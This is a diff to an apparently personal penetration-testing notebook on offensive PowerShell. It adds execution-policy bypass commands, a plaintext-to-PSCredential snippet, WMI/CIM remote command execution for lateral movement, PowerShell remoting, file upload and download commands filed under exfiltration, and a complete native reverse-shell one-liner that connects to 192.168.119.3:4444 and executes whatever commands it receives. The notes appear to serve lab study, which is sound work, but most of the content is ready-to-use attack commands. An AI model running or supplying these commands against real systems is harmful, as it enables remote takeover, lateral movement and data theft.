@@ -73,7 +73,30 @@ Check if you are running PowerShell or cmd: [[2 Tech-Specifics/Web/WebApp Attack
 	- does not grant administrator privileges when UAC is enabled
 - if user has an active session: use the `PsExec` tool
 
+### Bypass execution policies
+
+**Note:** Execution Policies can be enforced by Group Policies.
+
+| Command                                                                                        | Purpose                                |
+| ---------------------------------------------------------------------------------------------- | -------------------------------------- |
+| `<script> -ExecutionPolicy Bypass`or<br>`powershell -ep bypass` to start a powershell instance | Disable on per-script basis            |
+| `Get-ExecutionPolicy -Scope CurrentUser`                                                       | Show execution policy for current user |
+| `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`                         | Disable for current user               |
+
 # Snippets
+
+## Generic
+
+### Create a PSCredential object
+
+In powershell, credentials are typically not passed using string arguments, but using a credential object. See [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
+
+```powershell
+$username = '<username>';
+$password = '<password>';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+```
 
 ## Enumeration
 
@@ -93,19 +116,9 @@ See [[2 Tech-Specifics/OS/Windows/Enumeration - Windows/Manual Enumeration - Win
 Test-NetConnection -Port 445 192.168.50.151
 ```
 
-## Defense Evasion
+## Exfiltration
 
-Circumvent PowerShell execution policies.
-
-**Note:** Execution Policies can be enforced by Group Policies.
-
-| Command                                                                | Purpose                                |
-| ---------------------------------------------------------------------- | -------------------------------------- |
-| `<script> -ExecutionPolicy Bypass`                                     | Disable on per-script basis            |
-| `Get-ExecutionPolicy -Scope CurrentUser`                               | Show execution policy for current user |
-| `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` | Disable for current user               |
-
-## Download a File
+### Download a File
 
 using System.Net.Webclient
 
@@ -127,7 +140,7 @@ Invoke-WebRequest -uri <url> -Outfile <path>
 
 Add `-UseDefaultCredentials` to authenticate to the web service as the active user. This also makes use of cached [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos|Kerberos]] tickets.
 
-## Upload a File
+### Upload a File
 
 using System.Net.WebClient:
 
@@ -145,14 +158,56 @@ curl.exe -X POST --upload-file <filepath> http://<ip>:<port>/<filename>
 
 **Note:** You MUST specify the `.exe`extension, since only `curl`is an alias for `Invoke-WebRequest`
 
-## Reverse Shell Payloads
+## C2 & Lateral Movement
 
-powershell reverse shell:
+### WMI command execution
+
+To create the `$credential` object see [[#Create a PSCredential object]].
+
+As `<command>` e.g. launch an encrypted [[#Reverse Shell Payload]]
+
+```powershell
+ = <target_ip>
+$command = '<command>';
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName $target -Credential $credential -SessionOption $options 
+Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
+```
+
+### PowerShell Remoting
+
+See [Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting)
+
+ Various protocols can be used to issue PowerShell commands on a remote machine:
+
+ - [[2 Tech-Specifics/Network/Protocols/TCP 22 SSH|SSH]]
+ - [[2 Tech-Specifics/Network/Protocols/TCP 5985,5986 WinRM|WinRM]]
+
+#### New-PSSession
+
+Uses [[2 Tech-Specifics/Network/Protocols/TCP 5985,5986 WinRM|WinRM]] for remoting.
+
+To create the `$credential` object see [[#Create a PSCredential object]].
+
+Create a remote session:
+
+```powershell
+New-PSSession -ComputerName <ip> -Credential $credential
+```
+
+Interact with the session: `Enter-PSSession <session_id>`
+
+### Reverse Shell Payloads
+
+There are various options:
+
+- use [[3 Tools/shells/powercat|powercat]]
+- use a native payload (see below)
+
+PowerShell Native Reverse Shell:
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-
-Alternatively: use [[3 Tools/shells/powercat|powercat]] to gain a reverse shell
 
 # Hardening
